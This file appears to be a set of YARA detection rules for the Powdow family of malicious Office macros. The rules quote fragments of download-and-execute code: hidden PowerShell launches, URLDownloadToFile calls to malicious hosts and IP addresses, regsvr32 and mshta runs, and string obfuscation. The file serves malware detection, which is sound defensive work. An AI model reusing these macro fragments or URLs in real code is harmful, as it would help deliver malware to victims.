rule TrojanDownloader_O97M_Powdow_A_2147723915_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.A"
        threat_id = "2147723915"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "8"
        strings_accuracy = "Low"
    strings:
        $x_3_1 = "powershell.exe -NoP -NonI -W Hidden -Exec Bypass" ascii //weight: 3
        $x_2_2 = "Invoke-Expression" ascii //weight: 2
        $x_2_3 = "CompressionMode]::Decompress" ascii //weight: 2
        $x_1_4 = "IO.MemoryStream" ascii //weight: 1
        $x_1_5 = "FromBase64String" ascii //weight: 1
        $x_2_6 = {53 68 65 6c 6c 20 28 [0-45] 29}  //weight: 2, accuracy: Low
    condition:
        (filesize < 20MB) and
        (
            ((3 of ($x_2_*) and 2 of ($x_1_*))) or
            ((1 of ($x_3_*) and 2 of ($x_2_*) and 1 of ($x_1_*))) or
            ((1 of ($x_3_*) and 3 of ($x_2_*))) or
            (all of ($x*))
        )
}

rule TrojanDownloader_O97M_Powdow_2147724310_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow"
        threat_id = "2147724310"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 53 74 72 52 65 76 65 72 73 65 28 53 74 72 43 6f 6e 76 28 [0-15] 2c 20 76 62 55 6e 69 63 6f 64 65 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell (Replace(Replace(Split(" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_P_2147729333_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.P"
        threat_id = "2147729333"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {20 26 20 43 68 72 28 56 61 6c 28 43 68 72 28 56 61 6c 28 43 68 72 28 [0-12] 29 20 26 20 43 68 72 28 [0-12] 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 75 62 20 44 6f 63 75 6d 65 6e 74 5f 4f 70 65 6e 28 29 02 00 41 70 70 6c 69 63 61 74 69 6f 6e 2e 52 75 6e 20 22 [0-31] 22 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
        $x_1_3 = {43 61 6c 6c 42 79 4e 61 6d 65 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 [0-31] 28 22 [0-31] 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_AA_2147743624_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.AA!MTB"
        threat_id = "2147743624"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "= GetObject(\"wi\" + \"nmg\" + \"mts\" + \":Wi\" + \"n32_\" + \"Pr\" + \"oc\" + \"ess\")" ascii //weight: 1
        $x_1_2 = {2e 57 72 69 74 65 20 43 68 72 28 43 42 79 74 65 28 22 26 48 22 20 26 20 4d 69 64 28 [0-32] 2c 20 6c 70 2c 20 32 29 29 29 3a 20 4e 65 78 74 3a 20 45 6e 64 20 57 69 74 68 3a 20 6f 62 6a 46 69 6c 65 2e 43 6c 6f 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = "MsgBox \"The d\" + \"ocum\" + \"ent \" + \"is pro\" + \"tected\" + \", you wi\" + \"ll ne\" + \"ed to sp\" + \"eci\" + \"fy a pa\" + \"sswo\" + \"rd to un\" + \"lock.\"" ascii //weight: 1
        $x_1_4 = "Environ(\"APPDATA\")" ascii //weight: 1
        $x_1_5 = ".Create" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_2147743809_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow!MTB"
        threat_id = "2147743809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "(0, \"http://wfpyutf.com/iz5/yaca.php?l=tze3.cab\", \"1.exp\", 0, 0)" ascii //weight: 1
        $x_1_2 = ".run \"regsvr32 1.exp\"" ascii //weight: 1
        $x_1_3 = "\"URLDownloadToFileA\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_2147743809_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow!MTB"
        threat_id = "2147743809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {66 72 6d 2e 64 6f 77 6e 6c 6f 61 64 20 [0-2] 2c 20 22 63 32 2e 70 64 66 22}  //weight: 1, accuracy: Low
        $x_1_2 = "Shell wu & bn & \"32 c2.pdf\"" ascii //weight: 1
        $x_1_3 = "\"URLDownloadToFileA\"" ascii //weight: 1
        $x_1_4 = ".SelectNodes(\"//Items\")(1).ChildNodes(2).Text" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_2147743809_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow!MTB"
        threat_id = "2147743809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Call URLDownloadToFile(0, \"http://e9bja.com/iz5/yaca.php?l=kpt4.cab\", Vw, 0, 0)" ascii //weight: 1
        $x_1_2 = ".run \"regs\" + \"vr32 \" & Vw" ascii //weight: 1
        $x_1_3 = "\"URLDownloadToFileA\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_2147743809_3
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow!MTB"
        threat_id = "2147743809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 39 79 67 77 32 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 6b 70 74 ?? 2e 63 61 62 22 2c 20 56 77 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".run \"regs\" + \"vr32 \" & Vw" ascii //weight: 1
        $x_1_3 = "\"URLDownloadToFileA\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_2147743809_4
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow!MTB"
        threat_id = "2147743809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {43 61 6c 6c 20 55 52 4c 44 6f 77 6e 6c 6f 61 64 54 6f 46 69 6c 65 28 30 2c 20 22 68 74 74 70 3a 2f 2f 6e 32 66 37 39 2e 63 6f 6d 2f 69 7a 35 2f 79 61 63 61 2e 70 68 70 3f 6c 3d 6b 70 74 ?? 2e 63 61 62 22 2c 20 56 77 2c 20 30 2c 20 30 29}  //weight: 1, accuracy: Low
        $x_1_2 = ".run \"regs\" + \"vr32 \" & Vw" ascii //weight: 1
        $x_1_3 = "\"URLDownloadToFileA\"" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_2147743809_5
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow!MTB"
        threat_id = "2147743809"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "DownloadFile \"http://sagc.be/s.txt\", Environ$(\"TEMP\") & \"\\Intel.txt\", True" ascii //weight: 1
        $x_1_2 = "= Environ$(\"TEMP\") & \"\\Intel.exe\"" ascii //weight: 1
        $x_1_3 = "FSO.FolderExists(Filename)" ascii //weight: 1
        $x_1_4 = "Put #1, , bits" ascii //weight: 1
        $x_1_5 = "= InternetOpen(\"\", 0, vbNullString, vbNullString, 0)" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_D_2147743817_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.D!MTB"
        threat_id = "2147743817"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "Private Declare PtrSafe Function CreateProcess Lib \"kernel32\" Alias \"CreateProcessA\"" ascii //weight: 1
        $x_1_2 = "= CreateProcess(zasxdcfv, StrReverse(Left$(ActiveDocument.Shapes(\"Text Box 2\").TextFrame.TextRange.Text," ascii //weight: 1
        $x_1_3 = ".TextFrame.TextRange.Text) - 1)), ByVal 0&, ByVal 0&, 1&" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_E_2147743818_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.E!MTB"
        threat_id = "2147743818"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "ShellRunner.Run \"cmd /c powershell -ep bypass -c" ascii //weight: 1
        $x_1_2 = "$stream=$webClient.OpenRead('http://mine.fortipower.com/shload.jpg');" ascii //weight: 1
        $x_1_3 = "shellload;\", 0, True" ascii //weight: 1
        $x_1_4 = ", \"#\", \"\"))" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_LKB_2147749701_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.LKB!MTB"
        threat_id = "2147749701"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 43 49 6e 74 28 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-16] 29 2e 56 61 6c 75 65 20 26 20 4d 69 64 28 [0-16] 2c 20 [0-24] 2c 20 32 29 29}  //weight: 1, accuracy: Low
        $x_1_2 = {3d 20 53 68 65 65 74 73 28 22 [0-16] 22 29 2e 43 65 6c 6c 73 28 [0-16] 29 2e 56 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {26 20 43 68 72 28 [0-21] 20 2d 20 [0-3] 29}  //weight: 1, accuracy: Low
        $x_1_4 = "Shell " ascii //weight: 1
        $x_1_5 = {47 6f 54 6f 20 [0-32] 02 00 45 6e 64 20 53 75 62}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SF_2147749869_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SF!MTB"
        threat_id = "2147749869"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 43 72 65 61 74 65 28 [0-37] 2c 20 4e 75 6c 6c 2c 20 [0-32] 2c 20 69 6e 74 50 72 6f 63 65 73 73 49 44 29}  //weight: 1, accuracy: Low
        $x_1_2 = "= Environ(\"TEMP\") & \"\\po\" + \"wer\" + \"shd\" + \"ll.d\" + \"ll\"" ascii //weight: 1
        $x_1_3 = {26 20 43 68 72 24 28 56 61 6c 28 22 26 48 22 20 26 20 4d 69 64 24 28 [0-32] 2c 20 [0-32] 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_4 = "+ \"ll3\" + \"2.e\" + \"xe \"" ascii //weight: 1
        $x_1_5 = ".Run targetPath, 0" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_ARJ_2147750011_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.ARJ!MTB"
        threat_id = "2147750011"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "If Right$(CurFolder, 1) <> \"\\\" Then CurFolder = CurFolder & \"\\\"" ascii //weight: 1
        $x_1_2 = {73 74 72 54 65 6d 70 20 3d 20 43 68 72 28 56 61 6c 28 22 26 48 22 20 2b 20 4d 69 64 28 [0-16] 2c 20 69 2c 20 32 29 29 29}  //weight: 1, accuracy: Low
        $x_1_3 = "Set process = GetObject(ChrW(119) & ChrW(105) & ChrW(110) & ChrW(109) & ChrW(103) & ChrW(109) & ChrW(116) & ChrW(115) _" ascii //weight: 1
        $x_1_4 = "If Err = 4198 Then MsgBox \"Document was not closed\"" ascii //weight: 1
        $x_1_5 = {50 75 74 20 23 31 2c 20 2c 20 43 68 72 24 28 37 37 29 20 2b 20 [0-18] 43 6c 6f 73 65 20 23 31}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SA_2147750971_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SA!MSR"
        threat_id = "2147750971"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MSR: Microsoft Security Response"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "ShowColToMove \"C:\\DiskDrive\\1\\Volume\\errorfix.bat" ascii //weight: 1
        $x_1_2 = {43 3a 5c 44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c 42 61 63 6b 46 69 6c 65 73 5c [0-9] 2e 6a 73 65}  //weight: 1, accuracy: Low
        $x_1_3 = {6e 64 6f 65 2e 6a 70 20 43 3a 5c 44 69 73 6b 44 72 69 76 65 5c 31 5c 56 6f 6c 75 6d 65 5c 42 61 63 6b 46 69 6c 65 73 5c [0-7] 2e 65 78 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SL_2147751139_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SL!MTB"
        threat_id = "2147751139"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {53 68 65 6c 6c 20 52 65 70 6c 61 63 65 28 [0-85] 2c 20 22 25 [0-6] 25 22 2c 20 22 [0-21] 2e 63 6f 6d 2f [0-16] 2f [0-8] 2e 70 68 70 3f [0-16] 2e 63 61 62 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {53 68 65 6c 6c 40 20 52 65 70 6c 61 63 65 28 [0-85] 2c 20 22 25 55 22 20 26 20 22 [0-6] 25 22 2c 20 22 [0-21] 2e 63 6f 6d 2f [0-16] 2f [0-16] 2e 70 68 70 3f [0-16] 2e 63 61 62 22 29}  //weight: 1, accuracy: Low
        $x_1_3 = "bin.base64\"), 0" ascii //weight: 1
        $x_1_4 = "==\", \"bin.base64\")" ascii //weight: 1
        $x_1_5 = {28 64 61 74 61 2c 20 65 6e 63 6f 64 65 72 29 [0-16] 57 69 74 68 20 43 72 65 61 74 65 4f 62 6a 65 63 74 28 22 4d 73 78 6d 6c 32 2e 44 4f 4d 44 6f 63 75 6d 65 6e 74 22 29 2e 43 72 65 61 74 65 45 6c 65 6d 65 6e 74 28 22 74 6d 70 22 29}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (4 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SM_2147751501_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SM!MTB"
        threat_id = "2147751501"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "4"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = ".Open \"GET\", \"http://185.128.43.213/40r/pricequote.exe" ascii //weight: 1
        $x_1_2 = {2e 73 61 76 65 74 6f 66 69 6c 65 20 [0-35] 20 2b 20 22 5c 61 62 63 2e 65 78 65 22 2c 20 32}  //weight: 1, accuracy: Low
        $x_1_3 = ".GetSpecialFolder(2)" ascii //weight: 1
        $x_1_4 = {2e 52 75 6e 20 [0-35] 20 2b 20 22 5c 61 62 63 2e 65 78 65 22 2c 20 30 2c 20 54 72 75 65}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SM_2147751501_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SM!MTB"
        threat_id = "2147751501"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "5"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {2e 74 65 78 74 [0-21] 20 3d 20 53 74 72 52 65 76 65 72 73 65 28 22 5c 5c 5c 5c 70 6d 65 74 5c 5c 5c 5c 73 77 6f 64 6e 69 77 5c 5c 5c 5c 3a 63 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {2e 69 6e 66 22 2c 20 [0-16] 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_3 = {2e 73 63 74 22 2c 20 [0-16] 2e 76 61 6c 75 65}  //weight: 1, accuracy: Low
        $x_1_4 = {53 74 72 52 65 76 65 72 73 65 28 22 20 73 2f 20 69 6e 2f 20 70 74 73 6d 63 22 29 20 26 20 [0-16] 20 26 20 22 [0-16] 2e 69 6e 66 22}  //weight: 1, accuracy: Low
        $x_1_5 = "Sleep 3000" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SM_2147751501_2
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SM!MTB"
        threat_id = "2147751501"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "2"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = "(\"c4:0\\5p1rbodg1r3aam6dfa1t1a4\\5644d967446.3j4p3g2" ascii //weight: 1
        $x_1_2 = "(\"h9t7t6p1:e/c/fre08rcfbk3.9cdo0m2/2i6z55e/dyeacc6a0.fp8hfpb" ascii //weight: 1
        $x_1_3 = "(\"cf:b\\0p8r0ocg0rfa2m2d3a4t8ae\\42f65758b5b.0j9p6ga" ascii //weight: 1
        $x_1_4 = "(\"h0tdtcpd:b/6/2r30frbfdk1.fceoamb/0i9zf5a/fy0a6c1a5.2p5hdp" ascii //weight: 1
        $x_1_5 = {2e 65 78 65 63 20 [0-15] 20 26 20 22 20 22 20 26 20 [0-15] 28 22 63 ?? 3a ?? 5c ?? 70 ?? 72 ?? 6f ?? 67 ?? 72 ?? 61 ?? 6d ?? 64 ?? 61 ?? 74 ?? 61 ?? 5c [0-15] 2e ?? 6a ?? 70 ?? 67}  //weight: 1, accuracy: Low
        $x_1_6 = "(\"c5:c\\8perbo2g7rea2m0d4a3tea4\\36947613021.2j8p8gf" ascii //weight: 1
        $x_1_7 = "hct0t7p7:f/e/fh3qa33l7l3.bcbodm5/2i5z551/byba2c9aa.6pah3p" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (2 of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EM_2147751750_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EM!MTB"
        threat_id = "2147751750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "High"
    strings:
        $x_1_1 = "http://auto-mento.hu/wp-content/uploads/guide/9" ascii //weight: 1
        $x_1_2 = "emp\\mr6519.exe" ascii //weight: 1
        $x_1_3 = "Tfa8s71MVS" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_EM_2147751750_1
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.EM!MTB"
        threat_id = "2147751750"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "3"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {68 74 74 70 3a 2f 2f 6f 77 65 6e 74 69 2e 63 6f 6d 2f [0-16] 2e 65 78 65}  //weight: 1, accuracy: Low
        $x_1_2 = "C:\\DXckaGP\\POSpwEi\\uuLORJh.exe" ascii //weight: 1
        $x_1_3 = "URLDownloadToFileA" ascii //weight: 1
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SN_2147752050_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SN!MTB"
        threat_id = "2147752050"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {23 49 66 20 56 42 41 37 20 54 68 65 6e [0-8] 50 72 69 76 61 74 65 20 44 65 63 6c 61 72 65 20 50 74 72 53 61 66 65 20 46 75 6e 63 74 69 6f 6e 20 53 68 65 6c 6c 45 78 65 63 75 74 65 20 4c 69 62 20 22 73 68 65 6c 6c 33 32 2e 64 6c 6c 22 20 41 6c 69 61 73 20 22 53 68 65 6c 6c 45 78 65 63 75 74 65 41 22 20 5f}  //weight: 1, accuracy: Low
        $x_1_2 = "exe.athsm\\\\23metsys\\\\swodniw\\\\:c\", \"moc.tfosorcim\\\\atadmargorp\\\\:c\"" ascii //weight: 1
        $x_1_3 = {53 74 72 52 65 76 65 72 73 65 28 22 6c 6d 74 68 2e 78 65 64 6e 69 5c 5c 61 74 61 64 6d 61 72 67 6f 72 70 5c 5c 3a 63 22 29 2c 20 [0-21] 2e 54 65 78 74}  //weight: 1, accuracy: Low
        $x_1_4 = "StrReverse(\"moc.tfosorcim\\\\atadmargorp\\\\:c\") & \" \" & StrReverse(\"lmth.xedni\\\\atadmargorp\\\\:c\")" ascii //weight: 1
        $x_1_5 = {43 61 6c 6c 20 66 73 6f 2e 43 6f 70 79 46 69 6c 65 28 53 74 72 52 65 76 65 72 73 65 28 [0-21] 29 2c 20 53 74 72 52 65 76 65 72 73 65 28 [0-21] 29 2c 20 31 29}  //weight: 1, accuracy: Low
        $x_1_6 = {4f 70 65 6e 20 [0-16] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 [0-3] 50 72 69 6e 74 20 23 31 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_SO_2147752096_0
{
    meta:
        author = "defender2yara"
        detection_name = "TrojanDownloader:O97M/Powdow.SO!MTB"
        threat_id = "2147752096"
        type = "TrojanDownloader"
        platform = "O97M: Office 97, 2000, XP, 2003, 2007, and 2010 macros - those that affect Word, Excel, and PowerPoint"
        family = "Powdow"
        severity = "Critical"
        info = "MTB: Microsoft Threat Behavior"
        signature_type = "SIGNATURE_TYPE_MACROHSTR_EXT"
        threshold = "6"
        strings_accuracy = "Low"
    strings:
        $x_1_1 = {3d 20 52 65 70 6c 61 63 65 28 [0-18] 2c 20 [0-18] 2c 20 22 22 29}  //weight: 1, accuracy: Low
        $x_1_2 = {43 61 6c 6c 20 66 73 6f 2e 43 6f 70 79 46 69 6c 65 28 53 74 72 52 65 76 65 72 73 65 28 [0-18] 29 2c 20 53 74 72 52 65 76 65 72 73 65 28 [0-18] 29 2c 20 31}  //weight: 1, accuracy: Low
        $x_1_3 = "(\"c%:%\\%w%i%n%d%o%w%s%\\%s%y%s%t%e%m%3%2%\\%m%s%h%t%a%.%e%x%e%\"," ascii //weight: 1
        $x_1_4 = "\"c%:%\\%p%r%o%g%r%a%m%d%a%t%a%\\%i%n%d%e%x%.%h%t%m%l%\"," ascii //weight: 1
        $x_1_5 = "& \" \" &" ascii //weight: 1
        $x_1_6 = {4f 70 65 6e 20 [0-16] 20 46 6f 72 20 4f 75 74 70 75 74 20 41 73 20 23 [0-3] 50 72 69 6e 74 20 23 31 2c}  //weight: 1, accuracy: Low
    condition:
        (filesize < 20MB) and
        (all of ($x*))
}

rule TrojanDownloader_O97M_Powdow_FP_2147752341_0
{
    meta:
